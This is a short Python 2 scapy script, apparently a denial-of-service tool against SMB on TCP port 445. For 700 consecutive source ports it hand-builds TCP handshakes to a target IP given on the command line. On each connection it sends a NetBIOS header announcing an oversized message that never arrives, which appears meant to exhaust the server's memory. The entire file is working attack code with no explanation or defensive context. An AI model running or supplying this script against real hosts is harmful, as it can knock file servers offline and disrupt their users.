from scapy.all import *
import sys
conf.L3socket
conf.L3socket=L3RawSocket

i = IP()
i.dst = sys.argv[1]
p0 = int(sys.argv[2])

t = TCP()
t.dport = 445

for p in range(p0,p0+700):
   print p
   t.sport = p
   t.flags = "S"

   r = sr1(i/t)
   rt = r[TCP]
   t.ack = rt.seq + 1
   t.seq = rt.ack
   t.flags = "A"
   payload = '\x00\x01\xff\xff'
   send(i/t/payload)
